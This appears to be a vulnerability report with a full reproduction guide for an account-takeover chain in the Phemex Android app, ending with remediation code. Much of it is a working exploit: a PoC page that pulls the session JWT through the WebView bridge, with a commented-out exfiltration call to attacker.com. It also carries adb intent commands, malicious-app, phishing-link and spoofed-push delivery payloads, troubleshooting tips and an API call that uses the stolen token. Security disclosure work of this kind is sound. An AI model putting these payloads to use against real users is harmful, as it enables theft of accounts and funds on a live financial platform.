# Phemex Android 5.10.0 - Account Takeover via Exported Activity

## Vulnerability Summary

- **Type**: Exported Activity + Intent Injection + WebView JavaScript Bridge
- **Severity**: CVSS 9.3 (Critical)
- **Component**: `com.phemex.app.third.firebase.FirebasePushClickActivity`
- **Impact**: Complete account takeover through JWT token theft
- **Affected Version**: Phemex Android 5.10.0 (and potentially others)
- **CWE**: CWE-749 (Exposed Dangerous Method or Function), CWE-200 (Sensitive Data Exposure)
- **OWASP Mobile**: M1 (Improper Platform Usage)

## Attack Chain

```
1. FirebasePushClickActivity exported (no permission)
   ↓
2. Accept routerUrl via Intent extra
   ↓
3. Validation bypass (only checks google.message_id OR sendbird)
   ↓
4. URL routing without whitelist
   ↓
5. WebView loads attacker-controlled HTTPS page
   ↓
6. JavaScript Bridge exposed (no origin verification)
   ↓
7. Bridge.postMessage('getAppInfo') → returns JWT token
   ↓
8. Attacker captures token and UDID
   ↓
9. Use token to access api.phemex.com
   ↓
10. Complete account takeover
```

## What Makes This Different

The deep link validators in `GuideActivity` and `DeepLinkActivity` explicitly reject `http://` and `https://` schemas - this is intentional hardening. The bypass only exists because `FirebasePushClickActivity` was designed to handle FCM push payloads and routes its `routerUrl` extra through `jumpInnerPage`/`jumpPushPage` without going through the same validation gate. The Bridge then trusts whatever origin the WebView loaded.

These three flaws in isolation are low-medium risk. **Together they're a complete ATO primitive reachable from a single intent.**

## Required Setup

### Prerequisites
- **App Version**: Phemex 5.10.0 (APK: `phemex.apk`)
- **User State**: **MUST BE LOGGED IN** - Token is only available after authentication
- **Environment**: Android Emulator API 35 (ARM64 for Apple Silicon, x86_64 for Intel)
- **Network**: HTTPS hosting required (Android 9+ blocks HTTP)

### User Actions Before Exploitation
1. Install Phemex APK in emulator
2. **Create account or login with existing credentials**
3. Ensure app is in background (press Home button)
4. Keep app running (don't force close)

## Detailed Code Analysis

### 1. Entry Point: FirebasePushClickActivity

**File**: `com/phemex/app/third/firebase/FirebasePushClickActivity.java`

```java
// Line 40-60
public void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    Intent intent = getIntent();
    f.getInstance().interceptPushClick(intent);  // Validation here
    if (isActivityAlive(MainTabActivity.class)) {
        f.getInstance().handlePushClick(this);   // Routing here
    }
    finish();
}
```

**AndroidManifest.xml**:
```xml
<activity
    android:name="com.phemex.app.third.firebase.FirebasePushClickActivity"
    android:exported="true"
    android:theme="@style/AppTheme.Transparent">
    <intent-filter>
        <action android:name="com.phemex.app.FirebasePushClickActivity"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
```

**Vulnerability**:
- `android:exported="true"` with NO `android:permission` attribute
- Any app on device can invoke this Activity
- Can be triggered via intent: URI from browser

### 2. Validation Bypass

**File**: `com/phemex/app/third/firebase/f.java`

```java
// Line 113-124 (interceptPushClick method)
public void interceptPushClick(Intent intent) {
    if (intent == null) {
        return;
    }

    // KEY FINDING: Validation only checks for presence of these fields
    if (TextUtils.isEmpty(intent.getStringExtra("google.message_id")) &&
        TextUtils.isEmpty(intent.getStringExtra("sendbird"))) {
        return;  // Exit if BOTH are missing
    }

    // If either field is present, continue processing
    // Does NOT validate the routerUrl parameter!
    Bundle bundle = intent.getExtras();
    this.f20495a = bundle;  // Store for later use
}
```

**Critical Finding**:
- Validation requires **either** `google.message_id` **OR** `sendbird` extra
- Does NOT validate the actual URL in `routerUrl`
- Attacker just needs to add: `--es "google.message_id" "12345"`

### 3. URL Routing Without Whitelist

**File**: `com/phemex/app/third/firebase/f.java`

```java
// Line 47-68 (handlePushClick method)
public void handlePushClick(Context context) {
    Bundle bundle = this.f20495a;  // Previously stored extras
    if (bundle != null && bundle.containsKey("routerUrl")) {
        String routerUrl = bundle.getString("routerUrl");
        c.jumpInnerPage(context, routerUrl);  // Jump to URL without validation
    }
}
```

**File**: `com/phemex/app/utils/b.java`

```java
// Line 300-302 (jumpInnerPage → dispatchLink)
public static void dispatchLink(Context context, String url) {
    if (url.startsWith("http")) {  // Both http and https accepted!
        c.jumpH5Page(context, "", url);  // Open in WebView
    }
    // ... other routing logic
}
```

**Vulnerability**:
- No domain whitelist check
- Accepts ANY `https://` URL
- Contrast with `GuideActivity` which blocks http/https (security done right)

### 4. WebView Bridge Exposure

**File**: `com/phemex/app/ui/web/PhemexWebView.java`

```java
// Line 556 (constructor or init method)
addJavascriptInterface(new d(), "Bridge");  // Bridge always registered!
```

**Vulnerability**:
- Bridge is registered for ALL URLs loaded in this WebView
- No origin verification before registration
- Any loaded page can call Bridge methods

### 5. Token Leak via getAppInfo

**File**: `com/phemex/app/ui/web/PhemexWebView.java` (Bridge inner class `d`)

```java
// Line 573-605 (Bridge.postMessage handler)
public void i() {  // Method triggered by postMessage('getAppInfo')
    String token = WebManager.getInstance().getToken();
    if (TextUtils.isEmpty(token)) {
        token = j.getInstance().getUserToken();  // Fallback to user token
    }

    String udid = fn.a.getInstance().getUDID();
    String version = BuildConfig.VERSION_NAME;

    HashMap<String, Object> map = new HashMap<>();
    map.put("token", token);        // JWT session token!
    map.put("bid", udid);           // Device unique ID
    map.put("version", version);
    map.put("platform", "Android");

    String jsonData = new Gson().toJson(map);

    // Execute JavaScript callback with sensitive data
    evaluateJavascript("javascript:getAppInfo('" + jsonData + "')");
}
```

**Critical Vulnerability**:
- Returns **complete JWT token** to JavaScript
- Includes device ID (UDID) for API authentication
- No origin check before returning data
- Token is valid for authenticated API requests

### 6. Complete Call Chain

```
FirebasePushClickActivity.onCreate()
  ↓
f.interceptPushClick(intent)
  ├─ Check: google.message_id OR sendbird present? → YES (bypass)
  └─ Store: intent.getExtras() to this.f20495a
  ↓
f.handlePushClick(context)
  ├─ Extract: routerUrl from stored extras
  └─ Call: c.jumpInnerPage(context, routerUrl)
  ↓
b.dispatchLink(context, url)
  ├─ Check: url.startsWith("http")? → YES
  └─ Call: c.jumpH5Page(context, "", url)
  ↓
PhemexWebView created and loads URL
  ├─ Register: addJavascriptInterface(new d(), "Bridge")
  └─ Load: webView.loadUrl(attackerUrl)
  ↓
Attacker page: <script>Bridge.postMessage('getAppInfo')</script>
  ↓
PhemexWebView.d.i() executed
  ├─ Retrieve: getUserToken() → JWT
  ├─ Retrieve: getUDID() → Device ID
  └─ Execute: evaluateJavascript("getAppInfo('" + json + "')")
  ↓
Attacker callback: window.getAppInfo = function(data) { /* steal token */ }
  ↓
Token exfiltrated to attacker server
  ↓
Attacker uses token with api.phemex.com
```

## Exploitation Steps

### Step 1: Prepare PoC HTML Page

Create `poc.html`:

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Phemex Security Test</title>
<style>
body {
    background: #0a0a0a;
    color: #00ff00;
    font-family: monospace;
    padding: 20px;
}
h1 { color: #ff0000; }
pre {
    background: #1a1a1a;
    padding: 15px;
    border-left: 4px solid #00ff00;
    overflow-x: auto;
}
</style>
<script>
// CRITICAL: Define callback BEFORE calling Bridge
window.getAppInfo = function(data) {
    console.log('[EXPLOIT] Callback triggered!');
    console.log('[DATA]', data);

    try {
        var parsed = JSON.parse(data);

        // Display captured data
        document.getElementById('token').textContent = parsed.token || 'N/A';
        document.getElementById('bid').textContent = parsed.bid || 'N/A';
        document.getElementById('version').textContent = parsed.version || 'N/A';
        document.getElementById('platform').textContent = parsed.platform || 'N/A';
        document.getElementById('raw').textContent = JSON.stringify(parsed, null, 2);

        // Log to console
        console.log('[TOKEN]', parsed.token);
        console.log('[DEVICE_ID]', parsed.bid);

        // Exfiltrate to attacker server (disabled for PoC)
        // fetch('https://attacker.com/collect', {
        //     method: 'POST',
        //     headers: {'Content-Type': 'application/json'},
        //     body: data
        // });

        document.getElementById('status').textContent = '✅ EXPLOITATION SUCCESSFUL';
        document.getElementById('status').style.color = '#00ff00';

    } catch(e) {
        console.error('[ERROR]', e);
        document.getElementById('status').textContent = '❌ Parse Error: ' + e.message;
        document.getElementById('status').style.color = '#ff0000';
        document.getElementById('raw').textContent = data;
    }
};

// Wait for page load, then call Bridge
window.addEventListener('load', function() {
    console.log('[EXPLOIT] Page loaded');

    if (typeof Bridge !== 'undefined') {
        console.log('[EXPLOIT] Bridge object found!');
        console.log('[EXPLOIT] Bridge type:', typeof Bridge);

        // Try to enumerate methods (may fail on some Android versions)
        try {
            console.log('[EXPLOIT] Bridge methods:', Object.getOwnPropertyNames(Bridge));
        } catch(e) {
            console.log('[EXPLOIT] Cannot enumerate Bridge methods');
        }

        // Call Bridge.postMessage with 'getAppInfo' command
        try {
            console.log('[EXPLOIT] Calling Bridge.postMessage("getAppInfo")...');
            Bridge.postMessage('getAppInfo');
            console.log('[EXPLOIT] Bridge call successful, waiting for callback...');
        } catch(e) {
            console.error('[EXPLOIT] Bridge call failed:', e);
            document.getElementById('status').textContent = '❌ Bridge call failed: ' + e.message;
            document.getElementById('status').style.color = '#ff0000';
        }

    } else {
        console.error('[EXPLOIT] Bridge object NOT FOUND');
        document.getElementById('status').textContent = '❌ Bridge not found (not in PhemexWebView?)';
        document.getElementById('status').style.color = '#ff0000';
    }
});
</script>
</head>
<body>
<h1>🚨 Phemex Account Takeover PoC</h1>
<p id="status">⏳ Waiting for Bridge...</p>

<h2>Captured Data:</h2>
<p><strong>Token:</strong> <span id="token">-</span></p>
<p><strong>Device ID:</strong> <span id="bid">-</span></p>
<p><strong>Version:</strong> <span id="version">-</span></p>
<p><strong>Platform:</strong> <span id="platform">-</span></p>

<h2>Raw JSON:</h2>
<pre id="raw">Waiting...</pre>
</body>
</html>
```

### Step 2: Host PoC on HTTPS

**CRITICAL**: Android 9+ (API 28+) blocks cleartext HTTP traffic by default.

**Option A: Use GitHub Pages** (Recommended)
```bash
# Create GitHub repo and upload poc.html
# Access at: https://yourusername.github.io/poc.html
```

**Option B: Use Netlify/Vercel** (Quick)
```bash
# Drag and drop poc.html to Netlify
# Get instant HTTPS URL
```

**Option C: Self-hosted with valid certificate**
```bash
# Requires a domain with valid SSL certificate
# Self-signed certs will be rejected by Android
```

**Option D: Python HTTPS server with self-signed cert** (For testing, but problematic)
```bash
# Generate certificate
openssl req -x509 -newkey rsa:4096 -nodes \
  -keyout key.pem -out cert.pem -days 365 \
  -subj "/CN=localhost"

# Start server
python3 -c "
import http.server, ssl
server = http.server.HTTPServer(('0.0.0.0', 8443), http.server.SimpleHTTPRequestHandler)
server.socket = ssl.wrap_socket(server.socket, certfile='cert.pem', keyfile='key.pem', server_side=True)
print('Server running at https://localhost:8443/')
server.serve_forever()
"

# Access from emulator:
# https://10.0.2.2:8443/poc.html (10.0.2.2 = host machine)
```

⚠️ **Known Issue with Self-Signed Certs**: Android will show `NET::ERR_CERT_AUTHORITY_INVALID`. Solutions:
1. Use valid certificate (recommended)
2. Install CA cert in emulator (requires root, complex)
3. Modify app's network security config (requires APK rebuild)

### Step 3: Fire Malicious Intent

```bash
# Basic command structure
adb shell am start \
  -n com.phemex.app/com.phemex.app.third.firebase.FirebasePushClickActivity \
  --es routerUrl "https://YOUR_HTTPS_URL/poc.html" \
  --es "google.message_id" "12345"

# Example with GitHub Pages:
adb shell am start \
  -n com.phemex.app/com.phemex.app.third.firebase.FirebasePushClickActivity \
  --es routerUrl "https://yourusername.github.io/phemex-poc.html" \
  --es "google.message_id" "exploit_$(date +%s)"

# Alternative: Use sendbird field instead
adb shell am start \
  -n com.phemex.app/com.phemex.app.third.firebase.FirebasePushClickActivity \
  --es routerUrl "https://YOUR_URL/poc.html" \
  --es sendbird "true"
```

**What Happens**:
1. Intent triggers `FirebasePushClickActivity`
2. Validation checks for `google.message_id` → ✓ Present
3. `routerUrl` is extracted: `https://YOUR_URL/poc.html`
4. `jumpInnerPage` → `dispatchLink` → `jumpH5Page`
5. `PhemexWebView` created with `Bridge` registered
6. PoC page loads in WebView
7. JavaScript calls `Bridge.postMessage('getAppInfo')`
8. Token returned to `window.getAppInfo()` callback

### Step 4: Monitor Exploitation

**Terminal 1: Monitor logcat for sensitive data**
```bash
# Clear previous logs
adb logcat -c

# Monitor for token/credentials
adb logcat | grep --color=always -iE "(token|jwt|bearer|session|auth|credential)"
```

**Terminal 2: Monitor WebView console output**
```bash
adb logcat | grep --color=always -E "chromium|Console|WebView"

# Look for:
# [EXPLOIT] Bridge object found!
# [EXPLOIT] Calling Bridge.postMessage
# [EXPLOIT] Callback triggered!
# [TOKEN] eyJ0eXAiOiJKV1QiLCJhbGc...
```

**Terminal 3: Capture screenshot**
```bash
sleep 5  # Wait for page to load
adb exec-out screencap -p > phemex_exploit_$(date +%Y%m%d_%H%M%S).png
```

### Step 5: Analyze Captured Token

If token was successfully captured from logcat or JavaScript console:

```bash
# Extract JWT token (example)
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQSEVNRVgiLCJzdWJqIjo4ODYyMzc3LCJleHAiOjE3NzIxNTExNDh9.xxx"

# Decode JWT header
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq .

# Decode JWT payload
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Example output:
# {
#   "iss": "PHEMEX",
#   "subj": 8862377,  # User ID
#   "exp": 1772151148  # Expiration timestamp
# }
```

### Step 6: Verify Token Validity (Your Account Only!)

⚠️ **CRITICAL**: Only test against YOUR OWN account. Unauthorized access is illegal.

```bash
# Test if token works with Phemex API
curl -s https://api.phemex.com/accounts/accountPositions \
  -H "phemex-auth-token: $TOKEN" \
  -H "x-phemex-device: $DEVICE_ID" \
  -H "User-Agent: PhemexApp Android 5.10.0 $DEVICE_ID" \
  | jq .

# If successful, you'll see authenticated account data
# This proves complete account takeover
```

## Expected Results

### Indicators of Successful Exploitation

1. **WebView opens** displaying your PoC page
2. **Console logs show**:
   ```
   [EXPLOIT] Page loaded
   [EXPLOIT] Bridge object found!
   [EXPLOIT] Calling Bridge.postMessage("getAppInfo")...
   [EXPLOIT] Callback triggered!
   [TOKEN] eyJ0eXAiOiJKV1Qi...
   ```

3. **PoC page displays**:
   - Token: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...` (JWT)
   - Device ID: `626e6361-3663-3837-2d33-316239323766`
   - Version: `5.10.0`
   - Platform: `Android`

4. **Token is valid** for API requests (test on your own account only)

### If Exploitation Fails

| Symptom | Likely Cause | Solution |
|---------|--------------|----------|
| Activity not found | Wrong package/activity name | Verify exact name from manifest |
| Intent ignored silently | Missing required field | Add `--es "google.message_id" "12345"` |
| ERR_CLEARTEXT_NOT_PERMITTED | Using HTTP instead of HTTPS | Use HTTPS URL only |
| NET::ERR_CERT_AUTHORITY_INVALID | Self-signed certificate | Use valid cert or install CA in emulator |
| Bridge undefined | Wrong WebView loaded | Check if URL routing worked correctly |
| Callback not triggered | Callback defined too late | Define `window.getAppInfo` BEFORE calling Bridge |
| Empty token | User not logged in | Login to Phemex app first |

## Known Issues & Solutions

### Issue 1: HTTPS Certificate Validation

**Problem**: Android rejects self-signed certificates with `NET::ERR_CERT_AUTHORITY_INVALID`

**Root Cause**: Android 7+ (API 24+) only trusts system CA certificates by default

**Solutions**:
1. **Use GitHub Pages / Netlify** (valid certificate, easiest)
2. **Install CA certificate** (requires root emulator):
   ```bash
   adb root
   adb remount
   # Convert PEM to Android format and install
   ```
3. **Modify network_security_config.xml** (requires APK rebuild)

**Recommendation**: Use GitHub Pages for PoC hosting.

### Issue 2: Required Intent Fields Discovery

**Problem**: Initially tried wrong field name (`gcm.message_id`)

**Discovery Process**:
1. Decompiled APK with jadx
2. Found `FirebasePushClickActivity` in manifest
3. Traced to `f.interceptPushClick()` method
4. Analyzed validation logic at line 117-119
5. Found correct field: `google.message_id` (NOT `gcm.message_id`)

**Lesson**: Always analyze validation code directly, don't assume field names.

### Issue 3: User Must Be Logged In

**Problem**: Token is empty if user not authenticated

**Solution**:
1. Install app: `adb install -r phemex.apk`
2. Launch app: `adb shell am start -n com.phemex.app/.MainActivity`
3. **Manually login in emulator UI**
4. Press Home (app stays in background)
5. Then fire exploit intent

**Validation**: Check logcat for token presence before exploitation

## Real-World Delivery Vectors

### Vector 1: Malicious App (No Permissions Required)

Any app installed on the device can fire this intent:

```java
// Malicious app code
Intent intent = new Intent();
intent.setClassName("com.phemex.app",
    "com.phemex.app.third.firebase.FirebasePushClickActivity");
intent.putExtra("routerUrl", "https://attacker.com/steal.html");
intent.putExtra("google.message_id", "12345");
startActivity(intent);
```

No permissions required. Victim never sees prompt.

### Vector 2: Browser Intent URI

```html
<!-- Phishing page -->
<a href="intent://
#Intent;
  component=com.phemex.app/com.phemex.app.third.firebase.FirebasePushClickActivity;
  S.routerUrl=https://attacker.com/steal.html;
  S.google.message_id=12345;
end">
  Click here for free crypto!
</a>
```

Works on Chrome for Android (unpatched versions).

### Vector 3: Spoofed FCM Push

If attacker has FCM access or compromises FCM credentials:

```json
{
  "to": "/topics/all_users",
  "data": {
    "routerUrl": "https://attacker.com/steal.html",
    "google.message_id": "fcm_12345"
  }
}
```

Delivered as "legitimate" push notification.

## Impact Assessment

### Attacker Capabilities

With captured JWT token, attacker can:

1. **Read sensitive account data**:
   - Full account balances (crypto holdings)
   - Complete trade history
   - Personal information (email, phone, KYC data)
   - Wallet addresses and balances
   - API keys and sub-accounts

2. **Perform authenticated actions**:
   - Place market/limit orders
   - Cancel existing orders
   - Modify account settings
   - Generate new API keys

3. **Initiate withdrawals** (partial):
   - Can initiate withdrawal requests
   - Limited by 2FA on withdrawal (if enabled)
   - But can still drain via trading manipulation

4. **Long-term access**:
   - Token remains valid until expiration (hours to days)
   - Can be refreshed if refresh token also leaked
   - Persistent access if device ID is trusted

### Affected Users

- **All logged-in Phemex Android users** (version 5.10.0 and possibly others)
- **Attack requires**: User to tap malicious link or install malicious app
- **No special permissions** needed on attacker side
- **No prompt shown** to victim

### Business Impact

- **Financial Loss**: Trading manipulation, potential fund theft
- **Regulatory Compliance**: GDPR (data breach), PCI-DSS (payment data)
- **Reputation Damage**: Critical security vulnerability in financial app
- **User Trust**: Account takeover in crypto platform is catastrophic

## CVSS v3.1 Scoring

**Vector String**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`

**Base Score**: **9.3 (Critical)**

| Metric | Value | Justification |
|--------|-------|---------------|
| **Attack Vector (AV)** | Network (N) | Can be triggered remotely via intent: URI or malicious app download |
| **Attack Complexity (AC)** | Low (L) | No special conditions, user just needs to be logged in |
| **Privileges Required (PR)** | None (N) | No authentication needed to send intent |
| **User Interaction (UI)** | Required (R) | User must tap link or install app |
| **Scope (S)** | Changed (C) | Accesses data/functions outside component's privileges |
| **Confidentiality (C)** | High (H) | Complete token and credential theft |
| **Integrity (I)** | High (H) | Can execute trades, modify account |
| **Availability (A)** | None (N) | Does not impact service availability |

### Severity Justification

- **Critical (9.3)** because:
  - Complete account takeover possible
  - Financial app with real monetary value
  - No authentication needed to exploit
  - Wide attack surface (any app, any link)
  - Sensitive financial and personal data exposed

## Remediation

### Critical Fixes (Must Implement)

#### Fix 1: Remove Export or Add Permission

**File**: `AndroidManifest.xml`

```xml
<!-- BEFORE (Vulnerable) -->
<activity
    android:name="com.phemex.app.third.firebase.FirebasePushClickActivity"
    android:exported="true">
</activity>

<!-- AFTER (Fixed) -->
<activity
    android:name="com.phemex.app.third.firebase.FirebasePushClickActivity"
    android:exported="false"
    android:permission="android.permission.BIND_JOB_SERVICE">
</activity>
```

Or use signature-level permission:
```xml
<!-- Define permission -->
<permission
    android:name="com.phemex.app.permission.INTERNAL_PUSH"
    android:protectionLevel="signature"/>

<!-- Require permission -->
<activity
    android:name="com.phemex.app.third.firebase.FirebasePushClickActivity"
    android:exported="true"
    android:permission="com.phemex.app.permission.INTERNAL_PUSH">
</activity>
```

#### Fix 2: Implement URL Whitelist

**File**: `com/phemex/app/utils/b.java`

```java
// Add whitelist
private static final Set<String> ALLOWED_HOSTS = new HashSet<>(Arrays.asList(
    "phemex.com",
    "www.phemex.com",
    "m.phemex.com",
    "app.phemex.com"
));

public static void dispatchLink(Context context, String url) {
    // Validate URL before processing
    if (url.startsWith("http")) {
        try {
            Uri uri = Uri.parse(url);
            String host = uri.getHost();

            if (host == null || !ALLOWED_HOSTS.contains(host)) {
                Log.w(TAG, "Blocked untrusted host: " + host);
                Toast.makeText(context, "Invalid URL", Toast.LENGTH_SHORT).show();
                return;
            }

            c.jumpH5Page(context, "", url);
        } catch (Exception e) {
            Log.e(TAG, "Invalid URL: " + url, e);
            return;
        }
    }
    // ... rest of routing logic
}
```

#### Fix 3: Add Bridge Origin Verification

**File**: `com/phemex/app/ui/web/PhemexWebView.java`

```java
@JavascriptInterface
public void postMessage(String msg) {
    // Get current page URL
    String currentUrl = getUrl();

    // Verify origin before processing
    if (currentUrl == null || !currentUrl.startsWith("https://phemex.com")) {
        Log.e(TAG, "Bridge call from untrusted origin: " + currentUrl);
        return;  // Block untrusted origins
    }

    // Process message only if from trusted origin
    handleBridgeMessage(msg);
}
```

#### Fix 4: Don't Expose Sensitive Data via Bridge

**File**: `com/phemex/app/ui/web/PhemexWebView.java`

```java
// Remove sensitive data from Bridge responses
public void i() {  // getAppInfo handler
    HashMap<String, Object> map = new HashMap<>();
    map.put("version", BuildConfig.VERSION_NAME);
    map.put("platform", "Android");

    // DO NOT include:
    // map.put("token", token);  ← REMOVED
    // map.put("bid", udid);     ← REMOVED

    // Only return status
    map.put("isLoggedIn", !TextUtils.isEmpty(getUserToken()));

    String jsonData = new Gson().toJson(map);
    evaluateJavascript("javascript:getAppInfo('" + jsonData + "')");
}
```

### Defense in Depth (Recommended)

1. **Add intent signature verification** for sensitive activities
2. **Implement rate limiting** on Bridge API calls
3. **Add security logging** for all Bridge calls with origin
4. **Monitor for anomalous patterns** (calls from unexpected origins)
5. **Implement network security config** to restrict cleartext traffic
6. **Add certificate pinning** for api.phemex.com

## Validation Checklist

When reproducing this vulnerability, verify:

- [ ] Android SDK installed and emulator created
- [ ] Emulator architecture matches host (arm64 or x86_64)
- [ ] Phemex APK installed successfully
- [ ] **User logged into Phemex app**
- [ ] App placed in background (Home button pressed)
- [ ] PoC HTML hosted on valid HTTPS URL
- [ ] Intent includes `google.message_id` or `sendbird` field
- [ ] Intent includes `routerUrl` pointing to PoC
- [ ] adb command executed successfully
- [ ] WebView opens and loads PoC page
- [ ] JavaScript console shows "Bridge object found"
- [ ] Callback `window.getAppInfo` receives data
- [ ] Token is present in captured data (not empty)
- [ ] Token can be decoded as valid JWT
- [ ] (Optional) Token validated against api.phemex.com

## References

- **CWE-749**: Exposed Dangerous Method or Function - https://cwe.mitre.org/data/definitions/749.html
- **CWE-200**: Exposure of Sensitive Information - https://cwe.mitre.org/data/definitions/200.html
- **OWASP Mobile Top 10 - M1**: Improper Platform Usage - https://owasp.org/www-project-mobile-top-10/
- **Android WebView Best Practices**: https://developer.android.com/develop/ui/views/layout/webapps/best-practices
- **CVSS v3.1 Calculator**: https://www.first.org/cvss/calculator/3.1

---

**Case Version**: 1.0
**Last Updated**: 2026-02-27
**Reproduction Tested**: Yes (Apple Silicon, Android Emulator API 35)
**Time to Reproduce**: ~20 minutes (after environment setup)
